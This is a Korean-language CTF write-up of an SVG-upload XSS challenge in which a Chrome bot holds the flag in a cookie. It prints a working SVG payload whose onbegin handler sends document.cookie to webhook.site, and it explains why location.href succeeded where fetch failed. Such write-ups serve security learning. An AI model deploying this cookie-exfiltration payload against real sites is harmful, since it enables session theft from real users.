---
tier: Bronze 1
topics:
  - "\bXSS"
  - File Upload
solved-with: Self
---
### 문제 구조

목표: 크롬 봇이 업로드한 svg 파일에 접근할때 쿠키를 내 서버로 보내기

- `/?file=uploads/xxx.svg`
	- svg 파일을 업로드할 수 있는 폼 제공
	- `file` 쿼리 파라미터를 기반으로 SVG 파일을 불러오는데 아래의 조건이 아닌 경우 차단됨 (XSS 취약점 존재)
		- 최상위 태그가 `svg`이고 `xmlns=http://www.w3.org/2000/svg`
		- 허용한 태그만 들어있어야함. 예: `svg`, `path`, `rect`, `animate` 등
- `/upload`: POST 요청으로 svg 파일 업로드 가능. 
	- 업로드 하면 랜덤값을 이름 앞에 붙여서 `/uploads`에 저장
	- 저장 후 크롬 봇이 해당 파일의 위치에 접속하는데 봇은 쿠키로 플래그를 담고 있음. 

### 분석 및 풀이

SVG 파일에 악성 스크립트를 작성하여 XSS 공격을 수행할 수 있음. 플래그가 크롬 봇의 쿠키에 담겨 있으므로 쿠키 값을 webhook.site로 보내도록 하면 됨. 

``` html
<svg xmlns="http://www.w3.org/2000/svg">
	<set attributeName="font-size" onbegin="location.href = `https://webhook.site?param=${document.cookie}`"></set>
</svg>
```

### 시행 착오

서버 코드가 의도한 것인지 오류인지 모르겠지만 내가 업로드한 SVG 파일은 랜덤값이 붙어서 서버에 저장되는데 정작 리다이렉트는 랜덤값이 붙지 않고 파일 이름만으로 됐음. 그 결과 항상 존재하지 않는 파일에 접근해서 SVG 파일을 불러오지 못하는 구조임. 
=> Burp Suite로 패킷에서 랜던값을 추출해서 SVG 파일 결과를 확인했음. 

처음에 XSS 스크립트를 `fetch`로 작성했는데 크롬 봇에서 요청을 보내지 못했음. 그래서 `location.href`로 작성하니까 성공함. 

### 새롭게 배운 점

``` python
driver.get("http://127.0.0.1:8000/")
driver.add_cookie(cookie)
driver.get(f"http://127.0.0.1:8000/?file=uploads/{filename}")
        
WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "svg")))

driver.quit()
```

- `fetch(url)`: 비동기 네트워크 요청을 시작함. 브라우저가 종료되기 전에 요청이 실제로 전송된다는 보장이 없음. 
- `location.href = url`: 브라우저가 해당 URL로 이동함. 페이지 이동 과정에서 네트워크 요청이 발생함. 

`fetch`는 `driver.quit()`로 요청이 가지 않고 끊기고 `location.href`는 브라우저가 닫히기 전에 실행되서 성공한 정확한 이유는 알 수 없음. 

